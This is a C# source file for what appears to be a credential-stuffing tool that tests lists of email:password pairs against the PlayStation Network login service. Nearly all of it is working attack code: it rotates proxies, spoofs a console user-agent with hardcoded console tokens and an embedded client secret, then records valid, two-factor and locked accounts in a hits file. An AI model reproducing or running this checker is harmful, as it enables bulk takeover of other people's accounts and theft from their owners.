using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using ZuttPal;
using Console = Colorful.Console;
using StringContent = System.Net.Http.StringContent;

namespace ZuttPal
{
	internal class psn
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker2()
		{
			for (; ; )
			{
				while (!Checking17.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking17.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking17.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.AllowAutoRedirect = false;
								var uu = WebUtility.UrlEncode(email);
								var pp = WebUtility.UrlEncode(password);
								string yes = $"grant_type=password&client_id=076e6730-dd6e-4b6e-ac6e-fb52da665108&client_secret=hV7D5T0iLkPcIPFJ&scope=openid&username={uu}&password={pp}".Length.ToString();
								var random = new Random();
								string one1 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiUGNjYXNXRTcxblphOGJWR3lPZ09VUT09IiwidmVyIjoyLCJiIjoiUXlpb05SeUY1cVNHWjdxc1ZDaHV5WG1xeUE2SnluaVdSaVEwWkg4T0FnMD0iLCJzdiI6IjQuMDg3LjAwMCIsImMiOiJyUW5VZ0NoUGpMSSt2eEZKUHpxZmJKWWhyaFpPSzJ2RTF5MExoaXRpZ3p6ZFVqN0RraHpZaThUQTMzTWhFZExNIiwiZSI6MSwia2lkIjoiMDIwNDA0IiwibnBlbnYiOiJucCIsInBybiI6ImN0IiwiYXQiOjYsInBmIjoiUFMzIiwiZXhwIjoxNjExNzY3MDQzLCJpYXQiOjE2MTE2ODA2NDN9.LhgRCHB0ygSe_a4EQCx_icMFkQ_AJbjBAPAPcB0swHlRbtRU8H6KWb1R5GUXg6zw8ODpuM2rhM7IeyDMfjUFtyigTvFIVi4WKPdKX0vRyL7VzD8lkB30h1AkytSuWgly3eVu4K_u3QSGp4pqrVH - Czt6JxG69dAJj9hJNpa5DfXiRU45IVrGm_E4AtMAOHIDbBHnoqBmkF_S8MPWdT4c1hIkBZrROgj98RKplwLaSa943bxhV2TporK0edcZf0XyGSfs_bUB - lEYqSX72IToCzQufkaVCSb_ - Pdk5F0EQNHqbbEVxqGmfycJfvTWaZcIVaUQW_7QCmWf9gs2X0V2XA";
                                string one2 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiZVNkNFE2VElhVEg2Qjdmd2NjcEdSQT09IiwidmVyIjoyLCJiIjoiUmhUMDN2eFwvUk1kRHZzSlZsVUZCZkxVemdHWWVmUVRuOGpBNGxNVlhxRVE9Iiwic3YiOiI0LjA4Ny4wMDAiLCJjIjoiRnI5RFhsMDhId0FLSW9QY1E2aUpTaXhPQmxPVUw2MnRGQ3g4eTJVMzdudmxxOEI0Z0ZiODVEU2lZaHhcL3lOWVEiLCJlIjoxLCJraWQiOiIwMjA0MDQiLCJucGVudiI6Im5wIiwicHJuIjoiY3QiLCJhdCI6NiwicGYiOiJQUzMiLCJleHAiOjE2MTE3NjcwMzIsImlhdCI6MTYxMTY4MDYzMn0.P9Y6e5T79e8NgGSauvebxkSqB_udTZZqIQubpyix9GXVhstwRmhiMIptSG0nvEF25eJ7WQGGdpvCgPiZV3Ossv53wJPVNT4fEDvnUe_Q5OqBzcezs8xa6mUjQ3QZk3vCpISRSzrWqa1Qll3XFoTz9c - WeZBqes5qSfybfQ_XgRUxzvcHWx2iIPDYw5Su2vOvt7crTL4Cz4J1iD0I26qR8ptrUQ9 - cnKXZqpCiCg5MBdjaoDebI2xikL7zoB3D_hI22iDfl97TYERI - TiJLZ4eVzFyYl8 - r2Ro9s_hn_jufS_lHgq5mbhXzD7OihTlYZOdIwV - EHGjJkH69x80XwCzg";
                                string one3 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiN2c5aXJOK2dab3BcL2FQenB1VzdGdEE9PSIsInZlciI6MiwiYiI6IlwvQnV6T3BSRHhVV01MMVp1bUh3VXV2MFNpRFFwVTZOQ2NTZlNwM3lFNHhJPSIsInN2IjoiNC4wODcuMDAwIiwiYyI6Ik5mSllQb0dXcXp6VjFkSW1YVUliVzhlUVZ3cnBabTNDUkU2UEVCRVFMZzBoeGNpTm1vUlVcL2Q1QnZvZCt2Q1pDIiwiZSI6MSwia2lkIjoiMDIwNDA0IiwibnBlbnYiOiJucCIsInBybiI6ImN0IiwiYXQiOjYsInBmIjoiUFMzIiwiZXhwIjoxNjExNzY3MDgyLCJpYXQiOjE2MTE2ODA2ODJ9.Y6a_ANaI9_WR3yC0FSSaH9LXKrgVbpCzgq84_e7DIzDw3vuyNJDLQq1igSE8IHrdLn2xd522ogtCFQyj4k3zdMqyt4EGAXF_WODHinhb9Z_Gv2BNqNpM1QvZb_JF5Q5hBSqi2WHw6akXM4ZMRTFJk_2ZxK - J90aaOQb3hESVherPsnVBV0Jau501xv9Md7jlYZNntuDpEAytQpYT9NOmznwczKvE7tAdChamH - sQL2sbk6cOhuWerzIogiIRrRN_C7i5Gpz_qa7LSf6YCKSIMaV5Ss_f7PufAJjkA - 2_kW9ID4G1Rra3HqxTVIGSLydRLaoz7zpfoigQfL5PYQ8Vpw";
                                string one4 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiajQ0MUZaTE5mMHppNVY2WlM5YzJldz09IiwidmVyIjoyLCJiIjoiTVVkbXkxU1wvYWxTd05ZT0w2WmdDUzkxbVdXUkpPT3JkMFF4eHFrVkV3dzg9Iiwic3YiOiI0LjA4Ny4wMDAiLCJjIjoiOHlTMEFjSERpdFwvNU84cWNJOFNaYTlEcGVtZFwvZFNYK0VqMDFPdmk2NjI3cVkwVGY3Wm9Ma1ZSeWc4eVwvZmE2XC8iLCJlIjoxLCJraWQiOiIwMjA0MDQiLCJucGVudiI6Im5wIiwicHJuIjoiY3QiLCJhdCI6NiwicGYiOiJQUzMiLCJleHAiOjE2MTE3NjcwOTUsImlhdCI6MTYxMTY4MDY5NX0.jtVRNwjkbDBpAIo2 - hx3V29e - Az2C - XBeChZL2hwvGjn2UuXIPiLUc5C3Pr0eAQRMdDGM_rsmd5ov9_44ebt4Nu3VlyI8cmginlTTg92AatRJ3q2OZgCOawOTwCI__EF3be_JXI0oZKA30PaVvjKZt9hViQNNsNSC8x0D1YRLjtPNQ_HHBSr2iDEgvX1oT2XHMqqnnOBHRtAFxb3bkS3pWYAhrA7qJWbm4XXZPn1kdvwQavJkVoU3aP - yOutFrTuYoY1Ee5A7WZFBOVixFPRmN71fF989DzNavFwcRqTYWlHzkg0wo - 49nBLzJ2lcRj2iq3qKp8RBqx - 8qLOv8iJkw";
                                string one5 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiMkNcL1NRQ1FlUnRTXC9TSnUzTGRvVEN3PT0iLCJ2ZXIiOjIsImIiOiI3V3BHTUs4bHYxSjZ1K3Q2M0VnNENRK2xDVVN6alRVZENmcmFcL1daWGN4Zz0iLCJzdiI6IjQuMDg2LjAwMCIsImMiOiI0QjlROHczZHVJT1FLMjZKcmJRdlFmcmJnWnowWmI1UVRNUnJDdkxIZ0x3NWZIRFowQTNIQ1ZQT1RvOHFTcEQzIiwiZSI6MSwia2lkIjoiMDIwNDA0IiwibnBlbnYiOiJucCIsInBybiI6ImN0IiwiYXQiOjYsInBmIjoiUFMzIiwiZXhwIjoxNTg4MjkxMjAwLCJpYXQiOjE1ODczOTg0NzZ9.a7DlUAVIxUgQlCgU439T4QajrXg_84IhUL3Sw8CEpHniYOt6Kuma5xLOkr28 - KYkISTn5Y_AYOv1tIi6OYFsRdiasBincbFUdPDQGgAuYsKDSFFPFXHvS0Hxp6v48IQQGteEmwJGE - GDA_5PWF_K8O3vs0ZPOyvAAHjcBX5qz7nkrG - GJnjWn_ohqH8Ns5uHpEWxWwPL5eNbDWVFdUMvc0GL1ISQ5EJ9bg8F9fOZHQTpwkY6p2xNHXF1C2IfL2FAblcch1QJEo8Rv8GbPOgXpme - X7EpXhv5lLUD7N3LJI2YP5bBXiJ507twZJlHYF--c90b5mMCeRPIpF6hDR8jJQ";
                                string one6 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiZGNqZDdMdlVZc1RrbFhIdVdJK3dPQT09IiwidmVyIjoyLCJiIjoiVDNIT2tzV0FNbWxQNUVcL0laa2R2K3RENVRrbk9KV0FyUDhlSTB3eTMwdU09Iiwic3YiOiI0LjA4Ny4wMDAiLCJjIjoiZmxwd3RhQlRYMnd6NWhrbWkzb0dwaTlsQVo4emNcLytwb3BFcUVNejlDYkdlSDBJczdQdDNiOVRMa1dWXC95bElDIiwiZSI6MSwia2lkIjoiMDIwNDA0IiwibnBlbnYiOiJucCIsInBybiI6ImN0IiwiYXQiOjYsInBmIjoiUFMzIiwiZXhwIjoxNjExNzY3MDU2LCJpYXQiOjE2MTE2ODA2NTZ9.ViQJBgcrzn2Hk4_x_M07GLjXQ5BZmkHqfZURWDNHBIpN2e06NnWUv6QcD01cQQiP0YbOX62Ipwhpd3ksZBNNZVvaFLyGm5Jmj99rAymHqSoOmhYQgGUKpRJisZc289DuJz5g27YeeQxq4FApjYnAI0ekwWRRQc3T7CowhwjeNnIL0JPDIZjb2qqo5QfNF2KD9FQPdHxjRySEoW5jJqExm1lxYCHk_AwicxJCByftWBf9eU_gCcG0hroqAXP5RQBAO4lfc44EiFK6lPydL5M_vwPDMl0gDrtnX0fkyjWZbqV - B2HzqFDvTNT76Bnby2fFKGpY2po50Psqk4kfI_cnzQ";
                                string one7 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiOXdvcUs3T1BIcXh6elljWTV1S0hLUT09IiwidmVyIjoyLCJiIjoiSEpaRDlcL0Z0dk91RGxscnU2QVNxT1F4QWdvdzhQXC91K0RneE53OGJCZE13PSIsInN2IjoiNC4wODcuMDAwIiwiYyI6IlhtcXJEbDdWUmVyc3FtV1hUNVo3czZ2WDhSZm96SnM1eGVuOFJuNXRtZmRpSTJqMzRsRE1HTmlMeW5GNVJsN2YiLCJlIjoxLCJraWQiOiIwMjA0MDQiLCJucGVudiI6Im5wIiwicHJuIjoiY3QiLCJhdCI6NiwicGYiOiJQUzMiLCJleHAiOjE2MTE3NjcwNDMsImlhdCI6MTYxMTY4MDY0M30.B4SS3 - hiQ7PosNysmizDhWeuYiGiK_2JcZOhpt1Lzal2iwKwFarInMujVYfUFHGbfuZyiqeotTOm8OFenME9ZbgZJpN6_j9o1z0WJGM2rix - J4JINwZxsfosBtFSEhgi_6gZZ - Xv0PPmP1b1 - 1iVA - aQLWNGV6qmoLZye62i4hLYaQHthAll6k_sLaUeL830D3GFmgq9OmpSCfbuWrMa - 6gSPyc5RQc1d3 - AcyluM8z - q89th_kjcVi2gZGLa_6R6RalTI30FxpoIQ - ZV6ZFJfsklGVrXhuNYluXctDmx59YI1y40Wi0Xb3jkHEMYrw_9JmTj2xyErGbDucGXaol_A";
                                string one8 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiZU1IWWQ5RkdKY0VXRFRLd09tQzdQZz09IiwidmVyIjoyLCJiIjoiVWNzdUVmK29QRTVzQzVCMng0aXJMN1ZcL1dQMEhlYUIwNFpxWUIxcFIzUkU9Iiwic3YiOiI0LjA4Ny4wMDAiLCJjIjoiTWgydkhyR1wvdFwvM1IyYzl0T3RJTUFFZ2dseUhOUDh1ek5RcGVnTkxWMmVcL0p6T3lhWmZobEhzSUR3ZnAyM29aQiIsImUiOjEsImtpZCI6IjAyMDQwNCIsIm5wZW52IjoibnAiLCJwcm4iOiJjdCIsImF0Ijo2LCJwZiI6IlBTMyIsImV4cCI6MTYxMTc2Njg0MCwiaWF0IjoxNjExNjgwNDQwfQ.eHvLN0oxng8Ou - K2B_bosFot38LTCUGtVOMUIt_iUMrCwLh5CB2IMXcwl31CGKWVAotr3eobM4z5QvIJy32f_MX4yqv8JrDxEflYHEQ - ftvSKCBEIC1zWbXIUiEorOmwHJaurwn0dDu9y3EmkwrQjXXdm3KmLjrIPl0RBZM0OO5zu9zb3TAv3Q_3Mp7fo1DiVei5tlAxtyWRuNeJafjtiQWnzAvJ4iQ79bfggLMwmwayQRYEnwMcWoSjO5gcZRoUy8r2BAMh9XmunhE2lqBS1hv199f9YR1gLqE - QnWuIizyabNYXX0z5eQ87uim5GGPv8DKgSPHOBEpicj4uiTY0Q";
                                string one9 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiQ1VlQTlWck9tcHRabFZBQVd6M056UT09IiwidmVyIjoyLCJiIjoiMEZtYk4rWUtsZ0dWbXVxd3lHd2FTZnp5YzBTMmVmRHJVcnVaWElOWHhvMD0iLCJzdiI6IjQuMDg3LjAwMCIsImMiOiJGeW9jbUtoczRtWFdVY1crVHVpbHlhclwvbStjOU1lRWdlK1wvTFFhS0sxQWZaVDNBXC8zcnRIWDZlbExhWjVlSlI2IiwiZSI6MSwia2lkIjoiMDIwNDA0IiwibnBlbnYiOiJucCIsInBybiI6ImN0IiwiYXQiOjYsInBmIjoiUFMzIiwiZXhwIjoxNjExNzY3MDkzLCJpYXQiOjE2MTE2ODA2OTN9.IA5S6 - TRvwtWSc - D6r0IEkNmWP8KjPn5t6r0sAH - srXS3bE264nQ6o59SDbK0xD - UR9UmlLkOdpx - 6vcFjRou9NeUypSetSppLwrwsyyocDtEL0gxgQduFYc8JzbdN6jzg_jfiwScKAxi3NY9c1HhFJNNpE6m_OCBCXrS3vdJEO87oPF0U4ihs - hUP - W1nw5yi4MNlJi9vQKC3zOMNiIA6snNO - uMYAYwvY_d5XRXMNdpP_zz9xQsuGIWFzTV_NKud5tCvQl1l96ssUBspQipyzB7aJmIjwool - KtSh3whfxkubI7YuXmnckCORfDRjwIUuBdUcEwJUQDI3AfkqKNg";
                                string one10 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoibWo5Z0FoRmlhbFlBU3Y4YTE3dFwvcnc9PSIsInZlciI6MiwiYiI6ImFXUGVcLzZaY2pyemNDeWJ6VVI2TXFIYzJKVnA5cEVYejBTYUp5Y1V6K0J3PSIsInN2IjoiNC4wODcuMDAwIiwiYyI6IllnN291cUxQXC9Mc3JyMW5hakFDZHg0V3Q3SXRGXC9BcU94aGtRWlVWNXZKZVV5R3BPN2JOU2hSa1pkNHVKemRTcCIsImUiOjEsImtpZCI6IjAyMDQwNCIsIm5wZW52IjoibnAiLCJwcm4iOiJjdCIsImF0Ijo2LCJwZiI6IlBTMyIsImV4cCI6MTYxMTc2Njk3NywiaWF0IjoxNjExNjgwNTc3fQ.I_Pa7iUZfx - hBcBfgKNc - BmV85e5mM3aG3RQzFKzT0qte2GoGEY_Nho1ZJdT8Iu27VIgJTtULl0rd00DsR7daiHrCl_INpQPC7XTl2cC1J8EXivMMFJheeVVGG7pCiV61eKkTqLvfUx29Fk3ckWI9aoQ3EXJbZ - RcvEpPcDYmnsAgHEKtWaLVFPbjUyIANhWxQNHtcLGLcPBUTRNDQzFvZ1BAnBzTLusO0RKQ10AO - Vz759JBHn8SsYar_TTxOMPpdGosGFSsd5GFt52N5czb3lwRuL3UUBCtj8izj2pi164EfO4GwEXNdo_mojocM1dwAoEr0IbXzxsOxOB76oemQ";
                                string one11 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoidzJMdFRPK00zRXIxWmQ2V1FYODd0UT09IiwidmVyIjoyLCJiIjoiV0l0ZCtvU2tkeStwWGpmZmJmVGdTM2g0QkxLTXdZalNNVThUYXJvWXdhcz0iLCJzdiI6IjQuMDg3LjAwMCIsImMiOiJ1MUw2QkU3R2xlM015cU9PZUl1R3BBaXNFbHVLWWZFcWdWTWpRRzd3bnVDbGZYOXB4Zk1BOWhDRjRJckJtSFdSIiwiZSI6MSwia2lkIjoiMDIwNDA0IiwibnBlbnYiOiJucCIsInBybiI6ImN0IiwiYXQiOjYsInBmIjoiUFMzIiwiZXhwIjoxNjExNzY2OTgzLCJpYXQiOjE2MTE2ODA1ODN9.j4Hsy65xY7Q - 3D71Plkkn7l1e0N - h1Crka6fsmZIDrSGHYtO_zY7oEQj27Sx1nNkngszUfkRTFCSsMjSuzVtY0kezDbrGux8tkPwtXMRR86eTDNS1RxJv7JSWsMsZzM7HtCoMpxRwtcxzOcTaleCPE_S_mj5J0wfIzRv2K58ukwkYkhRPx99Lsizmfqav - WyaxbgsAt - ULYh9238xbLbVKMBgOxloe4KQs5iPDbJfbJegbVxVXksY - GuPIVEYcohyOub6QYd7UlcwpwpXn_6DsHtIZfPmf29GwUQl - wr5MIohfBy8gZ - iLVTv2_ - eDqX0t5samK4wpMoM72yRrx6tg";
                                string one12 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiWUJjN3d3OUxoTXNZNHd2V2tHdm5FQT09IiwidmVyIjoyLCJiIjoiK3pvcE9wQUE1dkxBeW1pWVBKSHByTDZkaFJDUWU3c1l0S3pVYitKcGVvaz0iLCJzdiI6IjQuMDg3LjAwMCIsImMiOiJnXC8xNGtlSFMyVHJPOWp6Yk1mVk03S3RUdkxvcHdqcVo5MnZpcENBTGNjMG5kK0RBQUZCVHRrY3kzeTNOODdSVyIsImUiOjEsImtpZCI6IjAyMDQwNCIsIm5wZW52IjoibnAiLCJwcm4iOiJjdCIsImF0Ijo2LCJwZiI6IlBTMyIsImV4cCI6MTYxMTc2NzEwMiwiaWF0IjoxNjExNjgwNzAyfQ.VGczjTJwNTqce7N9K3OCuehUXNfKKtrjfjSXqb - ig_dxPTgLKx0dmEuvmLpb5wCB9zxOvUbl71bLCK49TvaYD0vHfBF3bc3V7 - XB7_wRweYsNsaLKaF4CB - zKi - z66HaQ4aDRcje71rw6kx0Bl29ZgIX2nsezKV72Aowx_t_kwI9ED1FSyt00du8xiFWw7TJ7EijoCmH - u2TmoHOFHzMR5itjDXtH9jZ0Lr5hoFsldJ6BrrB - 6uo41 - x2OqhYrVDN0q2ObA2fTygXF2GRre1l06leABxEaCeYC_EWGnpKCHlN8sZ75e5W9BJFT5sVzEhDqjxXRu041HamHAlpxpNXA";
                                string one13 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoic3AxSEw3T0ZWdFhqWWhMZmtQVWMwUT09IiwidmVyIjoyLCJiIjoiTkpGU3ZQWFlOVm9aRlFYVjBtSnY1djVrYzI5XC9iRUNYU1wvbmRmSDhoTFE0PSIsInN2IjoiNC4wODcuMDAwIiwiYyI6ImFNdmxtbFhaWUJsd3M2aVU0Nk5nTTl6Wlo2bEZVME5CaDVUZHZzYkRvSlQyaTVxeGdUbUFsbUtQRytKS21WdmMiLCJlIjoxLCJraWQiOiIwMjA0MDQiLCJucGVudiI6Im5wIiwicHJuIjoiY3QiLCJhdCI6NiwicGYiOiJQUzMiLCJleHAiOjE2MTE3NjY4NDIsImlhdCI6MTYxMTY4MDQ0Mn0.nw4uK2IXwiZI4cksLjF6qP2Tco2nk0M9i8pnMXDqCK6j0Eyg4D2vDgr_HBhkwQrpyx - McfuXovSRjqNXILfSC49whpiFbTfnnleof1PyGQGJ2SQyTzU1NOxITy0tf96QSIKJfKfL - iq2tOh_KGYhhqWTMRTn6m4IYo01haKwX5Mr1lCKgQ8MUseSVbcY5zuXcL0w4Zex7UII0AfbdglV54gOLlGOsoDgIRgI47eLnEn7eHefLaf_Kb3e5YWRBnX0NiHnSlqbCgCHZsmmXxpciS - V - jEIvJQ6IsIF8xajtb - MdPHg2PXsuVASG2yTcv35d5gVQiehzk4IArfgrjMQYw";
                                string one14 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiaFh4a3RJUW5NQzlOTmgyNm5CeWllUT09IiwidmVyIjoyLCJiIjoiXC96R0N3aUV0aDRIU1RwSUZncUtSXC9PdjJyMzhGTE85RGh5aU41M1FxN1dRPSIsInN2IjoiNC4wODcuMDAwIiwiYyI6ImxNYnBUUTVFXC9DVUtjYUl4MDVwNnRMM1oyN0huaFl4czVrMHp2RDNjaGg5eVwvb001eXYyM1dcL2RUTGpOWnp3MkMiLCJlIjoxLCJraWQiOiIwMjA0MDQiLCJucGVudiI6Im5wIiwicHJuIjoiY3QiLCJhdCI6NiwicGYiOiJQUzMiLCJleHAiOjE2MTE3NjcwNjIsImlhdCI6MTYxMTY4MDY2Mn0.VhZm5g - WTC - pwkanO1sVrwyTslb8Qv78W1Z4qxffStgZTCGHMvUs6ifPk265VaU4kpZZwhU88Wy1TX1V3xRCNbfraBMwpWV3GPNzMvWL3dwW4SmXr9l596zbtGlpT - RSjySKcpm5wc8uvYJpF1Hdp1wfax07pEsIGFoSEEZgpOb_agDMdp5UH1Ax - 967gmJBLKYpMh4aTnA2OmTKOgxs9ehiQvXddC9JunbKzM7SaoTCxYWwFOkeVeskP4n5JwVBQrA - 3blfiVhhDRyL6ZqITZiS7xmAhw0DcV6S6ST3sjXB90NZaemAQ2rE8_2YKDiz6kmD0nNAnL3uctaii7aU0w";
                                string one15 = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoiem44ekFMdm5qU3h6TmVzeFwvTk9mNEE9PSIsInZlciI6MiwiYiI6ImkxY1BsKyt3b003T2FOa2pLeVdTXC9IK3ZvNG92eCtwNmI5ejAzdFNjNnZZPSIsInN2IjoiNC4wODcuMDAwIiwiYyI6ImlIRHNCcEJRcXZWOGpGcnBHVXI5WGFuWTQyWUJmYWtFdnNWYkVUTEJqaEZZeVdpQzhZd0hYcThueUVmRzYrMksiLCJlIjoxLCJraWQiOiIwMjA0MDQiLCJucGVudiI6Im5wIiwicHJuIjoiY3QiLCJhdCI6NiwicGYiOiJQUzMiLCJleHAiOjE2MTE3NjY4NzMsImlhdCI6MTYxMTY4MDQ3M30.b - hVQKh8Cx2BTT4dFz2W4KQoWaXMSiUTcMHGRf7qT5Yyizw3D3QpLGWDxRuJw8BnwoXHr7nUli5 - SbAhXcgFOT - pTel - lqq92eUyzzrCFmy1MsnWs0WyjqrUta5CWPaTd80oSIJRzxYYCCg8Tduma8x_9IMxMGrSrTfPxv0Emt3o - TkapPLMfDKb3TDl2K8F9BJONK3aBL7QA6guwZPYSrbN2m - 3YoPcGe2v7adpOnlLrl_WsqKQhBNLbd - k4IQEli8fBBt2vPSt5VHExhandmvaMFDmBpNwJm1P2qCuO0nBtctJ7MVQ2XFTNcZ0cB1VwWT4Ra8jGtZBXU6dCcvFQg";
                                var list = new List<string> { one1, one2, one3, one4, one5, one6, one7, one8, one9, one10, one11, one12, one13, one14, one15 };
								int index = random.Next(list.Count);
								string token = list[index];
								httpRequest.AddHeader("Host", "auth.api.np.ac.playstation.net");
								httpRequest.AddHeader("content_length", yes);
								httpRequest.AddHeader("X-NP-CONSOLE-TOKEN", token);
								httpRequest.AddHeader("User-Agent", "NpOAuthVsh/4.86");
								string bytes = $"grant_type=password&client_id=076e6730-dd6e-4b6e-ac6e-fb52da665108&client_secret=hV7D5T0iLkPcIPFJ&scope=openid&username={uu}&password={pp}";
								HttpResponse PostRequest = httpRequest.Post("https://auth.api.np.ac.playstation.net/2.0/oauth/token", bytes, "application/x-www-form-urlencoded");
								string str = PostRequest.ToString();
								if (str.Contains("cookie_attributes") || str.Contains("npsso") || PostRequest.ContainsCookie("npsso"))
								{
									Interlocked.Increment(ref Checking17.CheckedLines);
									Interlocked.Increment(ref Checking17.currentCpm);
									Interlocked.Increment(ref Checking17.Hits);
									Save(Path + "\\Hits.txt", account);
									if (Program.config.printgood == "True")
									{
										Console.WriteLine("[»] Valid - " + account, Color.Green);
									}
									break;
								}
								else if (str.Contains("error_code\":20") || str.Contains("Invalid login"))
								{
									Interlocked.Increment(ref Checking17.CheckedLines);
									Interlocked.Increment(ref Checking17.currentCpm);
									Interlocked.Increment(ref Checking17.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.DarkRed);
									}
									break;
								}
								else if (str.Contains("two step") || str.Contains("error_code\":23") || str.Contains("authentication_type\":\"two_step"))
								{
									Interlocked.Increment(ref Checking17.CheckedLines);
									Interlocked.Increment(ref Checking17.currentCpm);
									Interlocked.Increment(ref Checking17.twofa);
									if (Program.config.print2fa == "True")
									{
										Console.WriteLine("[»] 2FA - " + account, Color.DarkOrange);
									}
									break;
								}
								else if (str.Contains("Password expired") || str.Contains("error_code\":100") || str.Contains("Password credentials are locked"))
								{
									Interlocked.Increment(ref Checking17.CheckedLines);
									Interlocked.Increment(ref Checking17.currentCpm);
									Interlocked.Increment(ref Checking17.custom);
									if (Program.config.printlocked == "True")
									{
										Console.WriteLine("[»] Expired - " + account, Color.Purple);
									}
									break;
								}
							}
							catch (Exception )
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking17.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking17.retry);
								break;
							}
						}
					}
				}
			}
		}


		public static void Save(string path, string line)
		{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
